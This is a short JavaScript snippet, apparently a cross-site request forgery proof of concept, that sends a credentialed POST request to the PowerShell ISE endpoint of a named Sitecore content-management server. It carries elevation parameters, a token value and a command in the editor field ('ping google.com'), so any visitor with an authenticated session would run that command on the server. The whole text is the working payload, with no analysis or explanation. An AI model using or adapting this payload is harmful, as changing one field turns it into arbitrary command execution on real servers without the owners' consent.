
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/cm.dxp-dev.lenovo.com\/sitecore\/shell\/Applications\/PowerShell\/PowerShellIse?sc_bw=1", true);
        xhr.setRequestHeader("Accept", "*\/*");
        xhr.setRequestHeader("Accept-Language", "uk-UA,uk;q=0.8,en-US;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
        xhr.withCredentials = true;
        var body = "&__PARAMETERS=ise%3Aexecute%28elevationResult%3D1%29%28elevationResult%3D1%29&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=&__CONTEXTMENU=&__MODIFIED=&__ISEVENT=1&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACQ2Y2RiNmRmYi05NzlkLTRkNWQtYmVlZS03NjZkY2E3MjkzNDgL&__VIEWSTATE=0937BEF31B4F4B3AB8A40CB6300557F7&__VIEWSTATE=&scActiveRibbonStrip=&scGalleries=&SelectionText=&SelectionRange=&Breakpoints=&Editor=ping%20google.com";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      
